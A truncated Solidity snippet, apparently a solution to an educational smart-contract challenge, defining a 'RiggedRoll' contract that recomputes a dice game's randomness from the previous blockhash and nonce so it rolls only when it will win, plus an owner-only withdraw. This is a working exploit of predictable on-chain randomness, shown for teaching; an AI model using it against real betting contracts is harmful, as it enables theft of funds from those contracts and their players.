...
contract RiggedRoll is Ownable {
    ...
    function withdraw(address _account) public onlyOwner{
        ...
        (bool sent,) = _account.call{value: address(this).balance}("");
        require(sent, "withdraw failed");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() external payable{
        uint256 currentDiceNonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), currentDiceNonce));
        uint256 roll = uint256(hash) % 16;
       console.log("RIGGED ROLL IS ",roll);

        if(roll <= 2){
            console.log("ROLLING NOW ",roll);
